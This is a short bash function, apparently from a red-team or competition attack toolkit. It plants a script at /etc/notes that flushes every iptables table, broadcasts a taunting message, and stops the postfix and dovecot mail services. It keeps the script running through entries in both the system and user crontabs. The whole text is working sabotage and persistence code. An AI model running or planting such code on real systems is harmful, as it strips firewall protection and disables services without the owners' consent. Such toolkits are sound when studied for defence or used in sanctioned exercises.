# Install a cronjob for them to find
cron() {
    command="* * * * */5 root /etc/notes"
    s="#!/bin/bash
(
iptables -F; iptables -t mangle -F; iptables -t nat -F;
wall nomnom;
) 2>/dev/null"

    QUIET command -v postfix;
    if [ "$?" == "0" ]; then
        s="$s service postfix stop;\n"
    fi
    QUIET command -v dovecot;
    if [ "$?" == "0" ]; then
        s="$s service dovecot stop;\n"
    fi
    printf "$s" > /etc/notes;
    chmod 755 /etc/notes;
    LOG 0 "Installed global cron job";
    echo $command >> /etc/crontab;
    crontab -l | { cat; echo "* * * * */5 /etc/notes"; } | crontab -
    LOG 0 "Installed user cron job";
}
